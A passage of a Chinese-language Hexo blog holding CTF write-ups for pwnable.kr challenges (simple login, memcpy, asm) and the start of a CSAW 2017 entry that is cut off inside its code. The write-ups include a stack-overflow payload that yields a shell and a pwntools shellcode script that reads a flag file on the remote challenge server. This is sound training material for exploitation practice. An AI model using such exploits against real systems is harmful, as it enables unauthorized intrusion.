<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-pablelgi" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/30/pablelgi/" class="article-date">
  <time datetime="2017-09-30T03:33:22.000Z" itemprop="datePublished">2017-09-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/30/pablelgi/">pwnable.kr之simple login</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这道题主要考察栈溢出. 在进入正题之前, 首先还是对栈帧结构做一个总结, 因为之前很久没做都忘了.</p>
<p><img src="1.PNG" alt=""></p>
<p>如图所示, 我总结的栈结构和其他说法有些不同, 方便自己记忆吧, 是否合理有待讨论.</p>
<p>在这里我认为函数调用是父函数中断在某一个位置, 然后开始执行子函数的逻辑. EBP通常翻译成基址寄存器, 也就是当前栈底, 问题是父函数也有父函数, 而寄存器EBP只有一个, 因此在函数跳转时, 需要把父父函数的EBP保存在栈上. 另外需要保存的是父函数中断点PC后的下一个位置, 也就是当子函数执行回来时候, 父函数需要继续执行的位置, 很多材料里这个地址叫做ret, 感觉容易和汇编指令搞混.</p>
<p>接下来上(IDA F5)代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> *decoded; <span class="comment">// [esp+18h] [ebp-28h]</span></div><div class="line">  <span class="keyword">char</span> s[<span class="number">30</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> len; <span class="comment">// [esp+3Ch] [ebp-4h]</span></div><div class="line"></div><div class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">30u</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Authenticate : "</span>);</div><div class="line">  _isoc99_scanf(<span class="string">"%30s"</span>, s);</div><div class="line">  <span class="built_in">memset</span>(&amp;secret, <span class="number">0</span>, <span class="number">12u</span>);</div><div class="line">  decoded = <span class="number">0</span>;</div><div class="line">  len = Base64Decode((<span class="keyword">int</span>)s, (<span class="keyword">char</span> *)&amp;decoded);</div><div class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">12</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong Length"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">memcpy</span>(&amp;secret, decoded, len);</div><div class="line">    <span class="keyword">if</span> ( auth(len) == <span class="number">1</span> )</div><div class="line">      correct();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">_BOOL4 __<span class="function">cdecl <span class="title">auth</span><span class="params">(<span class="keyword">int</span> len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></div><div class="line">  <span class="keyword">char</span> *s2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></div><div class="line">  <span class="keyword">char</span> *local_secret; <span class="comment">// [esp+20h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="built_in">memcpy</span>(&amp;local_secret, &amp;secret, len);</div><div class="line">  s2 = (<span class="keyword">char</span> *)calc_md5((<span class="keyword">int</span>)&amp;v2, <span class="number">12</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"hash : %s\n"</span>, s2);</div><div class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(<span class="string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">correct</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> ( secret == <span class="number">0xDEADBEEF</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulation! you are good!"</span>);</div><div class="line">    system(<span class="string">"/bin/sh"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序给了带shell的correct函数, 因此不需要构造shell, 一开始看到程序是静态编译, 因为要用ROP, 胡思乱想了半天.</p>
<p>按照正常的逻辑执行, 用户输入正确的密码之后, auth函数进行校验通过, 条用correct函数, 验证secret前4字节=0xdeadbeef, 直接给出shell. 问题是, 这个正确密码无从得知, 需要通过溢出绕过验证.</p>
<p>大概是为了方便构造用户输入, 程序自带了贴心的base64, 脱去这层外衣之后, 实际受控的用户输入只有12个, 很不够用. 而且F5对程序的分析不理想, 一开始没有找到漏洞点. 事实上, 漏洞点在auth函数的汇编中可以看到, 很隐晦.</p>
<p><img src="2.PNG" alt=""></p>
<p>此处memcpy参数len最多12, src是secret, dest是eax中的指针, eax = [ebp + var_14] + 0xc, 注意var_14是ebp-14h, 那么eax最终指向ebp-14h+8h=ebp - 8, 就是图中的anonymous_0位置.</p>
<p><img src="3.PNG" alt=""></p>
<p>这个位置最多接收12个字节, 但是实际上当前函数只有8个字节, 多余四个会溢出并覆盖父函数EBP. 想要覆盖父函数EIP不够.</p>
<p>父函数EBP效果不如父函数EIP, 后者可以直接在返回时控制指令流. 但是控制父函数EBP也够了, 如前面论述, 父函数EBP指向父函数的栈底, 与父函数的返回值距离很近. 我们不能控制auth的返回值, 它一定返回到main, 但是main的栈底可以控制, 而栈底下一个元素就是main的返回值.</p>
<p>接下来寻找可控的”伪栈帧”位置, 前面提到,12位的secret,最后四位是溢出点, 前面8位可以布置成栈帧状:前四位是父父函数的EBP, 这里为了过检测必须是0xdeadbeef, 中间四位是correct地址. 这样一来, 可以构造输入如下:</p>
<p><code>base64.base64encode(p32(0xdeadbeef) + p32(addr_correct) + p32(addr_secret))</code></p>
<p>即可拿到flag.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/30/pablelgi/" data-id="cj86rj016000sgo99ccxh15mj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-memcpy" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/29/memcpy/" class="article-date">
  <time datetime="2017-09-29T10:00:48.000Z" itemprop="datePublished">2017-09-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/29/memcpy/">pwnable.kr之memcpy</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>感觉这道题考的是堆分配时字节对齐问题.</p>
<p>首先上代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">asm</span>(<span class="string">"rdtsc"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</div><div class="line">		dest[i] = src[i];</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> dest;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</div><div class="line">	<span class="keyword">size_t</span> i;</div><div class="line">	<span class="comment">// 64-byte block fast copy</span></div><div class="line">	<span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</div><div class="line">		i = len / <span class="number">64</span>;</div><div class="line">		len &amp;= (<span class="number">64</span><span class="number">-1</span>);</div><div class="line">		<span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</div><div class="line">			__asm__ __volatile__ (</div><div class="line">			<span class="string">"movdqa (%0), %%xmm0\n"</span></div><div class="line">			<span class="string">"movdqa 16(%0), %%xmm1\n"</span></div><div class="line">			<span class="string">"movdqa 32(%0), %%xmm2\n"</span></div><div class="line">			<span class="string">"movdqa 48(%0), %%xmm3\n"</span></div><div class="line">			<span class="string">"movntps %%xmm0, (%1)\n"</span></div><div class="line">			<span class="string">"movntps %%xmm1, 16(%1)\n"</span></div><div class="line">			<span class="string">"movntps %%xmm2, 32(%1)\n"</span></div><div class="line">			<span class="string">"movntps %%xmm3, 48(%1)\n"</span></div><div class="line">			::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</div><div class="line">			dest += <span class="number">64</span>;</div><div class="line">			src += <span class="number">64</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">// byte-to-byte slow copy</span></div><div class="line">	<span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</div><div class="line">	<span class="keyword">return</span> dest;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line"></div><div class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</div><div class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Hey, I have a boring assignment for CS class.. :(\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The assignment is simple.\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- What is the best implementation of memcpy?        -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- 1. implement your own slow/fast version of memcpy -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- 2. compare them with various size of data         -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"- 3. conclude your experiment and submit report     -\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This time, just help me out with my experiment and get flag\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No fancy hacking, I promise :D\n"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</div><div class="line">	<span class="keyword">int</span> e;</div><div class="line">	<span class="keyword">char</span>* src;</div><div class="line">	<span class="keyword">char</span>* dest;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;</div><div class="line">	<span class="comment">// allocate memory</span></div><div class="line">	<span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">	<span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">	src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="keyword">size_t</span> sizes[<span class="number">10</span>];</div><div class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">// setup experiment parameters</span></div><div class="line">	<span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;	<span class="comment">// 2^13 = 8K</span></div><div class="line">		low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</div><div class="line">		high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"specify the memcpy amount between %d ~ %d : "</span>, low, high);</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</div><div class="line">		<span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"don't mess with the experiment.\n"</span>);</div><div class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">		&#125;</div><div class="line">		sizes[i++] = size;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	sleep(<span class="number">1</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"ok, lets run the experiment with your configuration\n"</span>);</div><div class="line">	sleep(<span class="number">1</span>);</div><div class="line"></div><div class="line">	<span class="comment">// run experiment</span></div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</div><div class="line">		size = sizes[i];</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"experiment %d : memcpy with buffer size %d\n"</span>, i+<span class="number">1</span>, size);</div><div class="line">		dest = <span class="built_in">malloc</span>( size );</div><div class="line"></div><div class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></div><div class="line">		t1 = rdtsc();</div><div class="line">		slow_memcpy(dest, src, size);		<span class="comment">// byte-to-byte memcpy</span></div><div class="line">		t2 = rdtsc();</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span>, t2-t1);</div><div class="line"></div><div class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></div><div class="line">		t1 = rdtsc();</div><div class="line">		fast_memcpy(dest, src, size);		<span class="comment">// block-to-block memcpy</span></div><div class="line">		t2 = rdtsc();</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span>, t2-t1);</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"thanks for helping my experiment!\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"flag : ----- erased in this source code -----\n"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序中自己实现了一个快速的memcpy函数, 题目要求是只要能够跑完所有的测试用例就可以拿到flag, 但是随意输入一些会segment fault.</p>
<p><img src="memcpy/1.PNG" alt=""></p>
<p>这个神奇的浮点运算operand movntps没见过, 查一下它的定义, 发现有这样一个报错点:</p>
<blockquote>
<p>The destination operand is a 128-bit or 256-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version) or 32-byte (VEX.256 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</p>
</blockquote>
<p>也就是说它的目的地址需要是0x10对齐的, 但是看我们的程序, 此时操作目标是[edx] = 0x804c4a8, 明显没有0x10对齐, 这就是报错的原因.</p>
<p>回到源码里边溯源, 发现edx这个值是malloc返回值, 也就是说堆上返回的值.</p>
<p>假设我们现在使用这样一个数字序列让程序执行</p>
<p><code>8 16 32 64 128 256 512 1024 2048 4096</code></p>
<p>通过在malloc函数后面下断点可以查看堆上的布局. 在堆上首先分配0x8的chunk头, 接下来是8位对齐的空间. 由于程序没有调用过free, 所以堆是递增的. 8共分配了8+8=0x10个字节, 它本身是16位对齐的, 所以它的下一个16开始位置是对齐的. 16需要分配8+16=0x18位. 这样一来下一个就不对齐了. 这种效应在64之前没有影响, 因为64位以下调用的是slow_memcpy, 但是在64以上开始调用fast_memcpy, 就会崩溃.</p>
<p>解决这个问题很容易, 在每一个会导致不对齐的数字上+8, 那么就对齐了:</p>
<p><code>8 24 40 72 136 264 520 1032 2056 4104</code></p>
<p>注意8之后每一个都不对齐, 都加8就好了.</p>
<p><img src="memcpy/2.PNG" alt=""></p>
<p>就不直接贴flag了, 做到这里终于把toddler’s bottle做完了, 前边的好多题比较简单, 当时做没有写writeup. 喘一口气, 告一段落, 接下来继续前进! </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/29/memcpy/" data-id="cj86rj00r000pgo99zkdcom51" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-kr-heap/">pwnable.kr heap</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-asmlong" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/29/asmlong/" class="article-date">
  <time datetime="2017-09-29T08:12:29.000Z" itemprop="datePublished">2017-09-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/29/asmlong/">pwnable.kr之asm</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">con = ssh(host=<span class="string">'pwnable.kr'</span>, user=<span class="string">'asm'</span>, password=<span class="string">'guest'</span>, port=<span class="number">2222</span>)</div><div class="line">p = con.connect_remote(<span class="string">'localhost'</span>, <span class="number">9026</span>)</div><div class="line"></div><div class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</div><div class="line">shellcode = <span class="string">""</span></div><div class="line">shellcode += shellcraft.pushstr(<span class="string">'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span>)</div><div class="line">shellcode += shellcraft.open(<span class="string">'rsp'</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">shellcode += shellcraft.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</div><div class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'shellcode: '</span>)</div><div class="line">p.send(asm(shellcode))</div><div class="line"><span class="keyword">print</span> p.recvline()</div></pre></td></tr></table></figure>
<p>所有的系统调用都可以直接生产, ssh也可以连过去, 另外需要注意的就是context很重要.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/29/asmlong/" data-id="cj86rj00b000dgo99nmzqcy58" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwntools/">pwntools</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/">shellcode</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-csaw2017-cvv" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/28/csaw2017-cvv/" class="article-date">
  <time datetime="2017-09-28T09:25:18.000Z" itemprop="datePublished">2017-09-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/28/csaw2017-cvv/">CSAW 2017 CVV及tabIEZ writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>因为需要准备出差, 只做了一些小题</p>
</blockquote>
<h2 id="CVV"><a href="#CVV" class="headerlink" title="CVV"></a>CVV</h2><p>信用卡号码算算号器和随机生成器<br><a href="https://zh.wikipedia.org/zh-hans/Luhn%E7%AE%97%E6%B3%95" target="_blank" rel="external">https://zh.wikipedia.org/zh-hans/Luhn%E7%AE%97%E6%B3%95</a><br>从网上找的代码，有问题按照Luhn代码算法说明改</p>
<p>代码很烂，都是粘的还有错。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div 